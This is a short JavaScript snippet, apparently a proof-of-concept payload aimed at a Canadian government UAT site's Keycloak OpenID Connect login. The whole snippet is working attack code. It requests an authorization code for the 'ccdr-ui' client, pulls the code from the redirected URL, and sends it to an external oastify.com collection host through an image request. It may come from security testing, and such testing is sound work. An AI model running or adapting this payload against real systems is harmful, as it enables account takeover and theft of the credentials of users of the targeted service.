fetch('/auth/realms/individual/protocol/openid-connect/auth?client_id=ccdr-ui&redirect_uri=https%3A%2F%2Fuat.ised-isde.canada.ca%2Fccdr%2Freporting-entity%2Fsearch&response_type=code&scope=openid+profile+email&state=2b20cc9d5c6d4ca693ee4767656bd312&ui_locales=en', {redirect: 'follow'})
.then(r => {
  let code = new URL(r.url).searchParams.get('code');
  new Image().src = 'https://ld2caubjwq1qfplxktejxz26sxyomga5.oastify.com/' + code;
});
